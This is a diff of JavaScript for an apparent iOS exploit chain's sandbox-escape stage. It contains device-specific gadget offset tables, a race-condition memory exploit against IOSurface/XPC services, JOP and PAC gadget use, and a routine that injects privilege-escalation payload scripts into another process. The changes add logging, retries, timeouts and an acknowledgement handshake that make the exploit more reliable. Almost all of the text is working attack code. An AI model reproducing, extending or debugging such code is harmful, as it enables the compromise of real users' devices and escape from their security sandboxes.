@@ -1,7 +1,16 @@
 (() => {
-  // Define log = print so all logging works
-  let log = print;
-  sbx1_begin = Date.now(); print("[SBX1] Stage 5 started - initializing sandbox escape 1");
+  let sbx1_syslog = null;
+  try { sbx1_syslog = log; } catch (_) {}
+  const sbx1_print = print;
+  function SBX1_TRACE(msg, reportError = false) {
+    const text = String(msg);
+    try { sbx1_print("[SBX1] " + text, reportError); } catch (_) {}
+    try {
+      if (sbx1_syslog) sbx1_syslog("sbx1: " + text);
+    } catch (_) {}
+  }
+  sbx1_begin = Date.now();
+  SBX1_TRACE("Stage 5 started - initializing sandbox escape 1");
   const peCode = "&v={{LPE_64BITE}}";
   let wc_fcall = fcall;
   let wc_uread64 = read64;
@@ -12,8 +21,9 @@
   let gpu_fcall_sleep = null && gpuFcallEnableSleep;
   let gpu_fcall_wake = null && gpuFcallDisableSleep;
   function LOG(msg) {
-    if (true) print('[SBX1] ' + msg);
+    if (true) SBX1_TRACE(msg);
   }
+  LOG("Top-level primitive capture complete");
   let wc_get_cstring = function (js_str) {
     let s = js_str + "\x00";
     resolve_rope(s);
@@ -1492,8 +1502,7 @@
    }
 };
 
-    sbx1_offsets = {
-   ...sbx1_offsets,
+    Object.assign(sbx1_offsets, {
    "iPhone11,2_4_6_22F76": {
       malloc_restore_2_gadget: 0x1a9a3b6c8n,
       dyld_signPointer_gadget: 0x1a9a6d0a4n,
@@ -2170,10 +2179,9 @@
       transformSurface_gadget: 0x2103ecb70n,
       xpac_gadget: 0x1b683ca08n
    }
-};
+});
 
-    sbx1_offsets = {
-   ...sbx1_offsets,
+    Object.assign(sbx1_offsets, {
    "iPhone11,2_4_6_22G86": {
       _4_fcalls: 0x1c62b5bf8n,
       _CFObjectCopyProperty: 0x18e432700n,
@@ -4205,10 +4213,14 @@
       xpac_gadget: 0x1b6420a08n,
    }
 
-};
+});
 
 
     let offsets_sbx1 = sbx1_offsets[device_model];
+    if (!offsets_sbx1) {
+      LOG('missing sbx1 offsets for device_model=' + device_model + ' known=' + Object.keys(sbx1_offsets).join(','));
+      return false;
+    }
     transformSurface_gadget = offsets_sbx1.transformSurface_gadget + shared_cache_slide;
     dyld_signPointer_gadget = offsets_sbx1.dyld_signPointer_gadget + shared_cache_slide;
     malloc_restore_0_gadget = offsets_sbx1.malloc_restore_0_gadget + shared_cache_slide;
@@ -4790,6 +4802,7 @@
   let invoke_class = objc_getClass("NSInvocation");
   let jsc_class = objc_getClass("JSContext");
   let nsthread_class = objc_getClass("NSThread");
+  LOG("Resolving XPC and bootstrap symbols");
   let XPC_RETAIN = func_resolve("xpc_retain");
   let XPC_BOOL_CREATE = func_resolve("xpc_bool_create");
   let XPC_RELEASE = func_resolve("xpc_release");
@@ -4815,6 +4828,7 @@
   let XPC_ENDPOINT_CREATE = func_resolve("xpc_endpoint_create");
   let XPC_ENDPOINT_DISPOSE = func_resolve("xpc_endpoint_dispose");
   let XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY = func_resolve("xpc_connection_send_message_with_reply");
+  LOG("Resolved XPC and bootstrap symbols");
   let IOSURFACE_CREATE_XPC_OBJECT = func_resolve("IOSurfaceCreateXPCObject");
   let MIG_GET_REPLY_PORT = func_resolve("mig_get_reply_port");
   let DISPATCH_DATA_CREATE = func_resolve("dispatch_data_create");
@@ -5935,7 +5949,7 @@
     t.lock = wait_lock;
     return t;
   }
-  function sbx1sbx1_exp(size) {
+  function sbx1sbx1_exp(size, _retries_left = 3) {
     if (size != SBX1SBX1_EXP_SIZE) {
       LOG("[x] Error: EXP mapping length must match hardcoded size, for now.");
       return undefined;
@@ -5972,6 +5986,14 @@
     let busy_thread = sbx1sbx1_busy_thread_setup(race_thread_lock, threads_ready_counter, threads_done_counter, target_fm.fd);
     r = pread(target_fm.fd, scratch_buffer, MAX_TRANSFER_BYTES, 0n);
     assert(r == MAX_TRANSFER_BYTES);
+    function retry_sbx1sbx1_exp_after_sync_timeout(label) {
+      if (_retries_left <= 0) {
+        LOG(`[x] sbx1sbx1_exp retry limit reached (${label})`);
+        return undefined;
+      }
+      LOG(`[!] ${label} timed out during sbx1sbx1_exp setup, retries_left=${_retries_left}`);
+      return sbx1sbx1_exp(size, _retries_left - 1);
+    }
     let won = false;
     exp_bypass_interval = Date.now();
     LOG("Before searching loop");
@@ -5986,12 +6008,12 @@
       let r = 0n;
       pthread_yield_np(pthread_self());
       if(!cmp8_wait_for_value(threads_ready_counter, 2))
-        return sbx1sbx1_exp(size);
+        return retry_sbx1sbx1_exp_after_sync_timeout('threads_ready_counter');
       uwrite64(threads_ready_counter, 0n);
       ulock_wake(UL_COMPARE_AND_WAIT | ULF_WAKE_ALL, race_thread_lock, 0n);
       IOSurfacePrefetchPages(target_surface);
       if(!cmp8_wait_for_value(threads_done_counter, 2))
-        return sbx1sbx1_exp(size);
+        return retry_sbx1sbx1_exp_after_sync_timeout('threads_done_counter');
       uwrite64(threads_done_counter, 0n);
       kr = scaler_transfer(scaler_connection, source_surface, target_surface);
       r = uread64(read_address);
@@ -6134,7 +6156,9 @@
     wc_fcall(xpac(func_resolve("uname")), utsname);
     return utsname + 256n * 4n;
   }
+  LOG("Querying device_machine");
   let device_machine = wc_get_device_machine();
+  LOG(`device_machine pointer: ${device_machine.hex()}`);
   function sbx1sbx1() {
     let kr = KERN_SUCCESS;
     LOG("Sbx1 starting...");
@@ -6145,8 +6169,11 @@
       is_a12_devices = false;
       LOG("Running on non-A12 Devices");
     }
+    LOG(`surface_size budget: ${surface_size.hex()}`);
     let surface = create_iosurface(surface_size);
+    LOG(`surface handle: ${surface.hex()}`);
     let spray_memory_object = setup_guess_address(surface);
+    LOG(`spray_memory_object: ${spray_memory_object.hex()}`);
     let sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
     LOG(`connection: ${sbx1sbx1_ctx.connection.hex()}`);
     LOG(`source_surface: ${sbx1sbx1_ctx.source_surface.hex()}`);
@@ -6273,10 +6300,12 @@
             thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
             return false;
           }
-          thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
-          n_of_current_exp_write_threads = (n_of_current_exp_write_threads + 1n) % n_of_exp_write_threads;
-          if (n_of_current_exp_write_threads == 0n) {
-            n_of_current_exp_write_threads = 1n;
+          {
+            let prev_count = n_of_current_exp_write_threads;
+            thread_group_lock(exp_write_threads, prev_count);
+            let new_count = (prev_count + 1n) % n_of_exp_write_threads;
+            if (new_count == 0n) new_count = 1n;
+            n_of_current_exp_write_threads = new_count;
           }
           continue;
         }
@@ -6297,10 +6326,15 @@
           if (surface_address_remote != 0n) {
             break;
           }
+          usleep(1n);
         }
         LOG(`surface_address_remote: ${surface_address_remote.hex()}`);
-        setup_nativefcall_fcall();
-        {
+        LOG("[i] starting nativefcall bootstrap");
+        if (!setup_nativefcall_fcall()) {
+          LOG("[x] nativefcall setup failed, retrying endpoint");
+          services_idx = 0n;
+          success = false;
+        } else {
           LOG("[i] nativefcall setup done...");
           lazy_fcall("usleep", 5n * 1000n);
           mpd_fcall_noreturn(CALLOC, 0x100n, 1n, 0n, 0n, 0n, 0n, 0n, 0n);
@@ -6320,18 +6354,22 @@
             } else {
               LOG(`[!] calloc() crashed ${kr.hex()} !!! Probably wrong malloc_zones guess address !!!`);
               services_idx = 0n;
+              success = false;
               alive = false;
               break;
             }
           }
         }
-
-        //mach_port_deallocate(mach_task_self(), connection["reply_port"]);
-        mach_port_deallocate(mach_task_self(), connection["client_port"]);
+        LOG("[i] skipping reply_port deallocate to match original chain");
+        LOG("[i] deallocating client_port");
+        let client_port_kr = mach_port_deallocate(mach_task_self(), connection["client_port"]);
+        LOG(`[i] client_port deallocate returned ${client_port_kr.hex()}`);
 
         if (alive) {
+          LOG("[i] nativefcall path is alive; leaving service loop");
           break;
         }
+        success = false;
       }
     }
     if (success == false) {
@@ -6339,6 +6377,7 @@
       return false;
     }
     LOG("done");
+    LOG("[i] sbx1sbx1 returning success");
     return true;
   }
   function mpd_fcall_check_for_return() {
@@ -6382,6 +6421,7 @@
           return MPD_FCALL_TIMED_OUT;
         }
       }
+      usleep(1n);
     }
     let return_value = uread64(mpd_fcall_retval_ptr);
     return return_value;
@@ -6498,9 +6538,17 @@
     uwrite64(final_fcall_buf_local + 0x28n, 0xcafedeadn);
     uwrite64(nativefcall_buf_local, pacia(self_loop, 0n));
     uwrite64(surface_address, pacia(init_fcall, 0n));
-    while (uread64(final_fcall_buf_local + 0x28n) == 0xcafedeadn) {
-      usleep(1n);
+    {
+      const init_start = Date.now();
+      while (uread64(final_fcall_buf_local + 0x28n) == 0xcafedeadn) {
+        usleep(1n);
+        if (Date.now() - init_start > 10000) {
+          LOG("[x] setup_nativefcall_fcall timed out after 10s - remote process likely crashed");
+          return false;
+        }
+      }
     }
+    return true;
   }
   function reset_nativefcall(surface, x0_remote) {
     uwrite64(surface_address, pacia(self_loop, 0n));
@@ -6758,6 +6806,11 @@
   }
   function spawn_pe() {
     LOG("Spawning PE....");
+    const PE_ACK_OFFSET = 0x2300n;
+    let pe_ack_local = surface_address + PE_ACK_OFFSET;
+    let pe_ack_remote = surface_address_remote + PE_ACK_OFFSET;
+    uwrite64(pe_ack_local, 0n);
+    LOG(`[MPD] PE ack word: local=${pe_ack_local.hex()} remote=${pe_ack_remote.hex()}`);
     let pe_stage1_js_data = 0n;
     let pe_main_js_data = 0n;
     let pe_post_js_data = 0n;
@@ -6798,7 +6851,8 @@
       if (lsTweakSet.mgpatcher) lsTweaksOut.push('mgpatcher');
       if (lsTweakSet.applimit) lsTweaksOut.push('applimit');
       const INLINE_PREFETCH_MAX_BYTES = 96 * 1024;
-      let prelude = 'globalThis.__ls_tweaks = "' + lsTweaksOut.join(',') + '";\n';
+      let prelude = 'globalThis.__pe_ack_addr = 0x' + pe_ack_remote.toString(16) + 'n;\n';
+      prelude += 'globalThis.__ls_tweaks = "' + lsTweaksOut.join(',') + '";\n';
       prelude += 'globalThis.__ls_enable_fiveicon = ' + (lsTweakSet.fiveicon ? 'true' : 'false') + ';\n';
       prelude += 'globalThis.__ls_enable_powercuff = ' + (lsTweakSet.powercuff ? 'true' : 'false') + ';\n';
       prelude += 'globalThis.__ls_enable_mgpatcher = ' + (lsTweakSet.mgpatcher ? 'true' : 'false') + ';\n';
@@ -6844,15 +6898,19 @@
       pe_main_js_data = g_pe_main_js_data;
       pe_post_js_data = g_pe_post_js_data;
     }
+    LOG("[MPD] building CFStrings for PE payloads");
     let pe_stage_1_cfstring = mpd_create_cfstring(pe_stage1_js_data);
     let pe_main_cfstring = mpd_create_cfstring(pe_main_js_data);
+    LOG("[MPD] CFStrings ready");
     let arr = mpd_setup_fcall_jopchain();
     let jsvm_fcall_buff = arr[0];
     let jsvm_fcall_pc = arr[1];
     let jsvm_fcall_args = arr[2];
+    LOG("[MPD] JOP chain ready");
     mpd_fcall(DLOPEN, mpd_get_cstring("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"), 2n);
     let mpd_jsc_class = mpd_objc_getClass(mpd_get_cstring("JSContext"));
     let ctx = mpd_objc_alloc_init(mpd_jsc_class);
+    LOG("[MPD] JSContext allocated");
     let isnan_value = mpd_objectForKeyedSubscript(ctx, "isNaN");
     let isnan_func_addr = mpd_read64(isnan_value + 0x8n);
     let isnan_executable_addr = mpd_read64(isnan_func_addr + 0x18n);
@@ -6912,12 +6970,36 @@
     LOG(`xpac_gadget:${xpac_gadget.hex()}`);
     mpd_write64(new_func_offsets_buffer + idx * 0x8n, xpac_gadget);
     idx += 0x1n;
-    log("[SBX1] Executing pe_main.js..."); mpd_evaluateScript_nowait_exit(ctx, pe_main_cfstring); log("[SBX1] pe_main.js execution started");
+    LOG("Executing pe_main.js...");
+    mpd_evaluateScript_nowait_exit(ctx, pe_main_cfstring);
+    LOG("[MPD] pe_main.js scheduled; waiting for PE ack");
+    let pe_ack = 0n;
+    let pe_ack_start = Date.now();
+    while (Date.now() - pe_ack_start < 1000) {
+      pe_ack = uread64(pe_ack_local);
+      if (pe_ack == 0x1003n || pe_ack == 0x1badn) {
+        break;
+      }
+      usleep(1000n);
+    }
+    if (pe_ack == 0x1003n) {
+      LOG(`[MPD] PE syslog-entry ack observed: ${pe_ack.hex()}`);
+    } else {
+      if (pe_ack != 0n) {
+        LOG(`[MPD] PE partial ack before timeout: ${pe_ack.hex()}`);
+      } else {
+        LOG("[MPD] PE ack timeout after 1000ms");
+      }
+      LOG("[MPD] holding bridge for teardown cushion");
+      usleep(250000n);
+    }
     LOG("[MPD] pe spawned");
   }
   sbx1sbx1_interval = Date.now();
+  LOG("Entering sbx1sbx1()");
   let sbx1sbx1_succeeded = sbx1sbx1();
   sbx1sbx1_interval = Date.now() - sbx1sbx1_interval;
+  LOG(`sbx1sbx1() returned ${sbx1sbx1_succeeded}`);
   LOG(`[profiler] Sbx1 EXP bypass took ${exp_bypass_interval} ms`);
   if (sbx1sbx1_succeeded) {
     LOG(`[profiler] Sbx1 took ${sbx1sbx1_interval} ms`);
@@ -6925,12 +7007,15 @@
     LOG(`[profiler] Sbx1 failed in ${sbx1sbx1_interval} ms`);
   }
   if (sbx1sbx1_succeeded) {
+    LOG("Calling spawn_pe()");
     spawn_pe();
   }
   LOG("closing remaker_connection: " + remaker_connection);
   xpc_connection_cancel(remaker_connection);
   LOG = function (msg) {
-    log('sbx0: ' + msg);
+    try {
+      if (sbx1_syslog) sbx1_syslog('sbx0: ' + msg);
+    } catch (_) {}
   };
   sbx1_end = Date.now();
   LOG("ALL DONE!");
